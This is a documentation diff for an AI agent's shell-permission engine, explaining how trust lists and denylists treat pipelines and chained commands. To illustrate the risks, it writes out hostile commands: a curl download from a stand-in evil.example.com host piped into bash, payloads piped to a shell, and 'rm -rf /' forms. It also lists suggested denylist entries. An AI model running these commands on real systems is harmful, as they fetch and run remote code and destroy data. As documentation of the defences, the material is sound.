@@ -10,11 +10,11 @@ people the most confusion in practice.
 
 ## Quick summary
 
-| You see                                                          | What's happening                                                                                                                                                                                   |
-| ---------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Command ran without a prompt (green check)                       | Every sub-command matched a **Trusted** pattern.                                                                                                                                                   |
-| "Permission Required" dialog appeared                            | At least one sub-command was not trusted, or a denylist match fired, or the command used shell syntax we can't safely parse.                                                                       |
-| You configured the lists but the dialog still appears constantly | Most common cause: the command uses `\|` and not every piped step is trusted. Second most common: you expected `*` in the denylist to be a wildcard, but in the denylist it's a literal character. |
+| You see                                                          | What's happening                                                                                                                                                                                                                                                                                                              |
+| ---------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Command ran without a prompt (green check)                       | Every sub-command matched a **Trusted** pattern.                                                                                                                                                                                                                                                                              |
+| "Permission Required" dialog appeared                            | At least one sub-command was not trusted, or a denylist match fired, or the command used shell syntax we can't safely parse.                                                                                                                                                                                                  |
+| You configured the lists but the dialog still appears constantly | Most common cause: a pipeline like `cat foo \| jq .bar \| head` where the tail filters (`jq`, `head`) are not in your trust list. See [Pipelines and chained commands](#pipelines-and-chained-commands). Second most common: you expected `*` in the denylist to be a wildcard, but in the denylist it's a literal character. |
 
 ---
 
@@ -107,30 +107,202 @@ or just `rm` if you don't care about false positives on things like
 
 ---
 
-## Chains: `&&`, `||`, `;`, `|`
+## Pipelines and chained commands
 
-The engine splits chained commands on these operators (respecting
-quoting) and evaluates each piece independently. The rationale is
-security: `npm install && rm -rf node_modules` should never be
-auto-allowed by `npm *` because the `rm -rf` part would ride along.
+The engine treats `&&`, `||`, `;`, and `|` all the same way: it splits
+the command on any unquoted occurrence of those operators and evaluates
+each piece against the lists **independently**. For the whole command to
+auto-allow, every piece must pass.
 
-| Chain                | Sub-commands evaluated          |
-| -------------------- | ------------------------------- |
-| `ls && pwd`          | `ls`, `pwd`                     |
-| `cat foo \| jq .bar` | `cat foo`, `jq .bar`            |
-| `echo "a && b"`      | `echo "a && b"` (inside quotes) |
-| `cmd1 ; cmd2 ; cmd3` | `cmd1`, `cmd2`, `cmd3`          |
+This section unpacks that because pipelines are where most of the
+unexpected "Permission Required" dialogs come from in practice.
 
-For the whole command to auto-allow, **every** sub-command must be
-trusted. A single unknown step means "ask" — even for the other steps
-that would individually match.
+### The four chain operators
+
+Each operator has a different meaning in shell — but from the engine's
+perspective they all produce the same thing: a list of sub-commands the
+shell will run, each of which must be independently approved.
+
+| Operator | Shell meaning                                    | Engine treatment                   |
+| -------- | ------------------------------------------------ | ---------------------------------- |
+| `&&`     | Run right side only if left succeeded (exit 0)   | Split; each side is a sub-command. |
+| `\|\|`   | Run right side only if left failed (non-zero)    | Split; each side is a sub-command. |
+| `;`      | Run right side unconditionally after left        | Split; each side is a sub-command. |
+| `\|`     | Run both sides concurrently, piping stdout→stdin | Split; each side is a sub-command. |
+
+The engine does not care _why_ the operator is there. `ls && pwd`,
+`ls ; pwd`, and `ls | pwd` all produce the same sub-command list
+`[ls, pwd]` and the same decision logic applies to all three.
+
+### Why every piece is checked independently
+
+The rule "trust the whole pipeline if the first command is trusted"
+sounds convenient but is unsafe. The canonical attack is:
+
+```
+curl https://evil.example.com/install.sh | bash
+```
+
+If `curl *` were trusted and the engine stopped at the first piece, this
+would auto-execute a remote script. Splitting on `|` and requiring every
+piece to match a trust pattern makes that specific shape impossible to
+auto-allow without the user explicitly trusting `bash *` (which nobody
+should).
+
+The same logic applies to `&&`. Consider:
+
+```
+npm install && rm -rf node_modules
+```
+
+A blanket `npm *` trust must not auto-run the `rm -rf` piece. Splitting
+on `&&` and evaluating each piece keeps the two commands at arm's length.
+
+"Trust everything after `|`" is also unsafe without constraints:
+
+- `ls | sh` — pipes the output of `ls` into a shell that executes it.
+- `cat payload.sh | bash` — same attack as `curl | bash`, just from disk.
+- `echo "rm -rf /" | sudo sh` — trivially destructive.
+
+So the engine takes the conservative position: treat every piece as a
+first-class command the user must have consented to. The cost is
+friction when piping to innocuous filters (`head`, `jq`, `wc`); the
+benefit is a security property that's easy to reason about.
+
+### Walkthrough: a real pipeline
+
+Suppose the agent wants to run:
+
+```
+cat data.json | jq '.users' | head -20
+```
+
+and your trust list is:
+
+```
+cat *
+```
+
+Here's what the engine does:
+
+1. **Opt-in gate.** Trust list is non-empty, so authoritative mode is on.
+2. **Syntax guard.** No backticks, no `$(...)`, no `<(...)`, no newlines,
+   no lone `&`. The pipeline passes.
+3. **Split on unquoted `|`.** Three sub-commands:
+   - `cat data.json`
+   - `jq '.users'`
+   - `head -20`
+4. **Denylist check.** Empty in this example, so nothing fires.
+5. **Trust check per sub-command.**
+   - `cat data.json` — matches `cat *`. ✓
+   - `jq '.users'` — no pattern matches. ✗
+   - `head -20` — no pattern matches. ✗
+6. **Decision.** Not every sub-command is trusted → **ask**.
+
+To make the same pipeline auto-allow, the trust list would need:
+
+```
+cat *
+jq *
+head *
+```
+
+At that point all three pieces pass and the command runs without a prompt.
+
+### Common pipeline recipes
+
+If you use the agent for inspection-style work (reading JSON, paging logs,
+grepping output) these filters come up constantly. Add the ones you
+actually use; leave out the ones you don't — each extra entry is a small
+expansion of the trust surface.
+
+```
+# Starter pack for pipeline-heavy work
+cat *
+head *
+tail *
+wc *
+sort *
+uniq *
+cut *
+tr *
+column *
+grep *
+rg *
+jq *
+awk *
+sed *
+```
+
+A few notes on that list:
+
+- `awk` and `sed` are on it because they're ubiquitous in pipelines, but
+  both can write files or shell out (`awk 'BEGIN{system("rm -rf /")}'`,
+  `sed -i 's/a/b/' file`). If your threat model cares, add denylist
+  entries like `system(`, `-i `, `--in-place` to force approval on those
+  forms.
+- `xargs` is **not** on the list — it executes whatever it receives on
+  stdin as a command. Treat it as "runs arbitrary commands", not as a
+  filter. Add it to trust only if you genuinely need it.
+- `tee` is **not** on the list — it writes files. Add it explicitly if
+  you want to allow output-teeing, and consider whether to denylist
+  destructive paths.
+
+### Pipes that still ask
+
+Some programs look like pipeline filters but aren't read-only, and a few
+shapes of the pipe itself keep asking regardless of your trust list.
+
+| Shape                         | Why it keeps asking                                                                                                                              |
+| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `... \| sh` / `... \| bash`   | The tail is a shell interpreter; the content piped into it comes from somewhere and can be anything. Never auto-allow unless you mean to.        |
+| `... \| xargs <cmd>`          | `xargs` executes `<cmd>` with stdin-derived arguments. Effectively runs arbitrary commands. The `xargs <cmd>` piece needs its own trust entry.   |
+| `... \| sudo <cmd>`           | `sudo` is in the recommended denylist. Denylist always wins, so even a fully-trusted pipeline asks.                                              |
+| `... \| tee file`             | `tee` writes files. Not destructive by itself, but worth keeping manual unless you've scoped the paths.                                          |
+| `... \| sed -i 's/a/b/' file` | `sed -i` modifies files in place. The piece `sed -i 's/a/b/' file` will match `sed *` if present; denylist `-i ` (trailing space) to force asks. |
+| `cmd \| $(other)`             | Command substitution anywhere in the command forces ask — the syntax guard catches it before the split.                                          |
+| `cmd1 \| cmd2 &`              | Trailing lone `&` (background operator) is caught by the syntax guard and always asks.                                                           |
+
+The engine does not special-case `sh`, `bash`, `xargs`, or `tee`; they're
+only "dangerous tails" in the sense that trusting them is nearly
+equivalent to trusting every command. The recommendation is to keep them
+out of the trust list and let them prompt each time.
+
+### Quoted operators
+
+Operators inside quoted strings are preserved — the engine treats
+`echo "a && b"` as a single sub-command `echo "a && b"`, not as two.
+Same for single quotes, pipes, and semicolons. This matches bash
+semantics: bash doesn't re-parse quoted contents as operators either.
+
+```
+echo "a && b"        → [echo "a && b"]
+echo 'cat | head'    → [echo 'cat | head']
+grep "a;b" file      → [grep "a;b" file]
+```
+
+### FD redirection near pipes
+
+File-descriptor redirections like `2>&1` are recognized by the syntax
+guard and let through. So `cmd 2>&1 | head` splits cleanly into
+`cmd 2>&1` and `head`, each evaluated normally.
 
 ### Practical consequence
 
-If the agent routinely runs things like `cat file \| head -100`, you
-need `head *` in your trust list even though `head` by itself is
-innocuous. The engine has no idea `head` is safe; it only knows what
-you told it.
+Trust lists tuned for single commands do not transfer to pipelines.
+Concretely:
+
+| Your trust list                   | `git status` | `git status \| head -20` | Why                                               |
+| --------------------------------- | ------------ | ------------------------ | ------------------------------------------------- |
+| `git status*`                     | allow        | ask                      | Second piece `head -20` isn't covered.            |
+| `git status*`, `head *`           | allow        | allow                    | Both pieces match.                                |
+| `git *`                           | allow        | ask                      | Same reason — the pipeline tail is still the gap. |
+| `git *`, `head *`, `jq *`, `wc *` | allow        | allow                    | Any tail filter covered by the second set passes. |
+
+The rule of thumb: **trust the commands you want to run, then trust the
+small set of filters you want to pipe them into**. The filter list is
+short and mostly stable across projects; the command list is where your
+per-project customization lives.
 
 ---
 
